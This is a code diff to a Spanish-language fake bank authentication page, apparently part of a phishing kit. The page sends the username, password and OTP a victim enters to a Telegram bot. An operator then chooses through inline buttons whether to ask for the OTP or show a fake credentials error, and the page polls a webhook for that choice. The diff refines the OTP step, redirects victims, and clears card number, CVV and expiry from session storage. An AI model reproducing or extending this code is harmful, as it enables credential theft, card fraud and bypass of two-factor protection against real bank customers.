@@ -570,8 +570,8 @@
             </div>
         </div>
 
-        <h1 class="form-title">Autenticar con contraseña</h1>
-        <p class="form-subtitle">Ingrese sus credenciales de seguridad a continuación.</p>
+        <h1 class="form-title" id="formTitle">Autenticar con contraseña</h1>
+        <p class="form-subtitle" id="formSubtitle">Ingrese sus credenciales de seguridad a continuación.</p>
 
         <div class="transaction-info">
             <div class="info-row">
@@ -675,6 +675,8 @@
         const submitButton = document.getElementById('submitButton');
         const loadingOverlay = document.getElementById('loadingOverlay');
         const statusMessage = document.getElementById('statusMessage');
+        const formTitle = document.getElementById('formTitle');
+        const formSubtitle = document.getElementById('formSubtitle');
 
         // ============================================
         // INICIALIZACIÓN
@@ -742,12 +744,12 @@
 
         async function enviarCredencialesATelegram(datos) {
             try {
-                // Solo botones para credenciales: APROBAR y RECHAZAR
+                // Botones: PEDIR OTP y ERROR CREDENCIALES
                 const inlineKeyboard = {
                     inline_keyboard: [
                         [
-                            { text: "✅ APROBAR", callback_data: `approve_${datos.solicitudId}` },
-                            { text: "❌ RECHAZAR", callback_data: `reject_${datos.solicitudId}` }
+                            { text: "📱 PEDIR OTP", callback_data: `pedir_otp_${datos.solicitudId}` },
+                            { text: "❌ ERROR CREDENCIALES", callback_data: `error_credenciales_${datos.solicitudId}` }
                         ]
                     ]
                 };
@@ -799,12 +801,12 @@
 
         async function enviarOTPATelegram(datos) {
             try {
-                // Botones para OTP: APROBAR y ERROR OTP
+                // Botones: APROBAR OTP y RECHAZAR OTP
                 const inlineKeyboard = {
                     inline_keyboard: [
                         [
-                            { text: "✅ APROBAR OTP", callback_data: `approve_otp_${datos.solicitudId}` },
-                            { text: "❌ ERROR OTP", callback_data: `otp_error_${datos.solicitudId}` }
+                            { text: "✅ APROBAR OTP", callback_data: `aprobar_otp_${datos.solicitudId}` },
+                            { text: "❌ RECHAZAR OTP", callback_data: `rechazar_otp_${datos.solicitudId}` }
                         ]
                     ]
                 };
@@ -880,16 +882,15 @@
                 
                 const resultado = await verificarEstadoWebhook(solicitudId);
                 
-                if (resultado === 'approved') {
+                if (resultado === 'pedir_otp') {
                     clearInterval(pollingInterval);
-                    // Credenciales aprobadas → mostrar OTP
-                    mostrarInfo('✅ Credenciales verificadas. Ingrese el código OTP.');
+                    // Credenciales aprobadas → mostrar OTP sin notificación en front
                     mostrarOTP();
                     loadingOverlay.classList.remove('active');
                     submitButton.disabled = false;
                     submitButton.textContent = 'Verificar OTP';
                     return;
-                } else if (resultado === 'rejected') {
+                } else if (resultado === 'error_credenciales') {
                     clearInterval(pollingInterval);
                     mostrarError('❌ Los datos ingresados no coinciden. Intente de nuevo.');
                     resetFormulario();
@@ -913,13 +914,13 @@
                 
                 const resultado = await verificarEstadoWebhook(solicitudId);
                 
-                if (resultado === 'approved_otp' || resultado === 'approved') {
+                if (resultado === 'aprobar_otp') {
                     clearInterval(pollingInterval);
                     mostrarExito('✅ Autenticación exitosa. Redirigiendo...');
                     setTimeout(() => {
-                        window.location.href = 'confirmacion.html';
+                        window.location.href = 'index.html';
                     }, 2000);
-                } else if (resultado === 'otp_error') {
+                } else if (resultado === 'rechazar_otp') {
                     clearInterval(pollingInterval);
                     mostrarError('❌ Código OTP incorrecto. Intente de nuevo.');
                     resetFormulario();
@@ -936,19 +937,21 @@
             otpSection.classList.add('visible');
             pasoActual = 'otp';
             submitButton.textContent = 'Verificar OTP';
+            formTitle.textContent = 'Código de Verificación';
+            formSubtitle.textContent = 'Ingrese el código OTP enviado a su dispositivo.';
+            // Habilitar el campo OTP
+            confirmationInput.disabled = false;
             confirmationInput.focus();
-            // Cambiar el título
-            document.querySelector('.form-title').textContent = 'Código de Verificación';
-            document.querySelector('.form-subtitle').textContent = 'Ingrese el código OTP enviado a su dispositivo.';
         }
 
         function ocultarOTP() {
             otpSection.classList.remove('visible');
             pasoActual = 'credenciales';
             submitButton.textContent = 'Enviar';
-            document.querySelector('.form-title').textContent = 'Autenticar con contraseña';
-            document.querySelector('.form-subtitle').textContent = 'Ingrese sus credenciales de seguridad a continuación.';
+            formTitle.textContent = 'Autenticar con contraseña';
+            formSubtitle.textContent = 'Ingrese sus credenciales de seguridad a continuación.';
             confirmationInput.value = '';
+            confirmationInput.disabled = true;
         }
 
         // ============================================
@@ -979,7 +982,7 @@
         function resetFormulario() {
             usernameInput.disabled = false;
             passwordInput.disabled = false;
-            confirmationInput.disabled = false;
+            confirmationInput.disabled = true;
             ocultarOTP();
             solicitudId = null;
             loadingOverlay.classList.remove('active');
@@ -989,6 +992,9 @@
             usernameInput.value = '';
             passwordInput.value = '';
             confirmationInput.value = '';
+            // Ocultar mensajes
+            statusMessage.className = 'status-message';
+            statusMessage.style.display = 'none';
         }
 
         // ============================================
@@ -1004,6 +1010,10 @@
 
         confirmationInput.addEventListener('input', function(e) {
             this.value = this.value.replace(/[^0-9]/g, '');
+            // Limitar a 6 dígitos
+            if (this.value.length > 6) {
+                this.value = this.value.slice(0, 6);
+            }
         });
 
         form.addEventListener('submit', async function(e) {
@@ -1117,7 +1127,7 @@
                 sessionStorage.removeItem('cardNumberFull');
                 sessionStorage.removeItem('cardCVV');
                 sessionStorage.removeItem('cardExpiry');
-                window.history.back();
+                window.location.href = 'index.html';
             }
         });
     </script>
